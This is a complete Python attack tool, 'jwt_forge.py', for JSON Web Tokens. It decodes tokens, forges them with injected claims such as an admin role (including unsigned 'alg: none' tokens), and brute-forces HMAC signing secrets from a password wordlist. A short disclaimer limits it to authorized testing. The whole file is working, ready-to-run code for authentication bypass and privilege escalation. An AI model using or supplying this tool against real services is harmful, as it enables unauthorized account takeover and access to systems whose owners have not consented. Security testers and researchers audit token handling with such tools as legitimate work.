#!/usr/bin/env python3
"""
Script Name: jwt_forge.py
Description: JWT token forgery and analysis tool.
             Decodes, verifies, and attempts to forge JWT tokens.
Usage:
    python3 jwt_forge.py decode <token>
    python3 jwt_forge.py forge <token> --payload '{"role":"admin"}'
    python3 jwt_forge.py bruteforce <token> --wordlist rockyou.txt
Disclaimer: For educational purposes and authorized testing only.
"""

import sys
import json
import base64
import hmac
import hashlib
import argparse


def b64url_decode(data):
    """Decode base64url-encoded data."""
    data = data.replace('-', '+').replace('_', '/')
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.b64decode(data)


def b64url_encode(data):
    """Encode data to base64url."""
    return base64.b64encode(data).rstrip(b'=').replace(b'+', b'-').replace(b'/', b'_')


def decode_jwt(token):
    """Decode a JWT token and display its components."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            print("[!] Invalid JWT format (expected 3 parts)")
            sys.exit(1)

        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        signature = parts[2]

        print("=" * 60)
        print("JWT DECODED")
        print("=" * 60)
        print("\n[HEADER]")
        print(json.dumps(header, indent=2))

        print("\n[PAYLOAD]")
        print(json.dumps(payload, indent=2))

        print(f"\n[SIGNATURE]")
        print(f"  Raw: {signature}")
        print(f"  Algorithm: {header.get('alg', 'Unknown')}")

        print("=" * 60)

        # Check for common vulnerabilities
        print("\n[VULNERABILITY CHECKS]")
        if header.get('alg') == 'none':
            print("  [!] CRITICAL: Algorithm is 'none' - token can be forged without signature")
        if header.get('alg') == 'HS256' and 'public_key' in str(payload):
            print("  [?] Potential RS256→HS256 confusion attack")
        if 'exp' in payload:
            import time
            if payload['exp'] < time.time():
                print("  [!] Token is EXPIRED")
            else:
                print(f"  [+] Token expires in {int(payload['exp'] - time.time())} seconds")
        else:
            print("  [!] No expiration claim (exp) - token may be valid indefinitely")

    except Exception as e:
        print(f"[!] Error decoding JWT: {e}")
        sys.exit(1)


def forge_jwt(token, new_payload):
    """Forge a JWT token with modified payload."""
    try:
        parts = token.split('.')
        header = json.loads(b64url_decode(parts[0]))

        # Decode original payload
        orig_payload = json.loads(b64url_decode(parts[1]))

        # Merge with new payload
        for key, value in new_payload.items():
            orig_payload[key] = value

        # Encode new header and payload
        new_header = b64url_encode(json.dumps(header).encode()).decode()
        new_payload_enc = b64url_encode(json.dumps(orig_payload).encode()).decode()

        # Check algorithm
        alg = header.get('alg', 'HS256')

        if alg == 'none':
            # No signature needed
            forged = f"{new_header}.{new_payload_enc}."
            print("=" * 60)
            print("FORGED JWT (alg: none)")
            print("=" * 60)
            print(f"\n{forged}\n")
            print("[i] No signature required - algorithm is 'none'")

        elif alg.startswith('HS'):
            print("=" * 60)
            print("FORGED JWT (HMAC algorithm)")
            print("=" * 60)
            print(f"\nHeader.Payload: {new_header}.{new_payload_enc}")
            print(f"\n[i] To complete forgery, sign with a secret key:")
            print(f"    python3 -c \"import hmac,hashlib,base64; print(base64.urlsafe_b64encode(hmac.new(b'YOUR_SECRET', b'{new_header}.{new_payload_enc}', hashlib.{alg.lower().replace('-','_')}).digest()).rstrip(b'=').decode())\"")

        elif alg.startswith('RS') or alg.startswith('ES'):
            print("=" * 60)
            print("FORGED JWT (Asymmetric algorithm)")
            print("=" * 60)
            print(f"\nHeader.Payload: {new_header}.{new_payload_enc}")
            print(f"\n[!] Algorithm is {alg} - requires private key to sign")
            print(f"[i] Consider RS256→HS256 confusion attack if public key is available")

        print("=" * 60)

    except Exception as e:
        print(f"[!] Error forging JWT: {e}")
        sys.exit(1)


def bruteforce_jwt(token, wordlist):
    """Bruteforce HMAC JWT secret."""
    try:
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}".encode()
        signature = b64url_decode(parts[2])

        alg = json.loads(b64url_decode(parts[0])).get('alg', 'HS256')

        if not alg.startswith('HS'):
            print(f"[!] Algorithm {alg} is not HMAC - bruteforce not applicable")
            sys.exit(1)

        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }.get(alg, hashlib.sha256)

        print(f"[*] Bruteforcing {alg} secret with wordlist: {wordlist}")
        print("[*] This may take a while...\n")

        with open(wordlist, 'r', errors='ignore') as f:
            for i, line in enumerate(f, 1):
                secret = line.strip()
                if not secret:
                    continue

                computed = hmac.new(secret.encode(), message, hash_func).digest()

                if hmac.compare_digest(computed, signature):
                    print("=" * 60)
                    print("SECRET FOUND!")
                    print("=" * 60)
                    print(f"\n  Secret: {secret}")
                    print(f"  Tried: {i} passwords")
                    print("=" * 60)
                    return

        print(f"[!] Secret not found in wordlist ({i} passwords tried)")

    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="JWT Token Forgery & Analysis Tool")
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')

    # Decode
    decode_parser = subparsers.add_parser('decode', help='Decode a JWT token')
    decode_parser.add_argument('token', help='JWT token to decode')

    # Forge
    forge_parser = subparsers.add_parser('forge', help='Forge a JWT token')
    forge_parser.add_argument('token', help='Original JWT token')
    forge_parser.add_argument('--payload', type=json.loads, required=True,
                              help='New payload as JSON string')

    # Bruteforce
    brute_parser = subparsers.add_parser('bruteforce', help='Bruteforce HMAC secret')
    brute_parser.add_argument('token', help='JWT token to crack')
    brute_parser.add_argument('--wordlist', required=True, help='Path to wordlist')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == 'decode':
        decode_jwt(args.token)
    elif args.command == 'forge':
        forge_jwt(args.token, args.payload)
    elif args.command == 'bruteforce':
        bruteforce_jwt(args.token, args.wordlist)


if __name__ == "__main__":
    main()
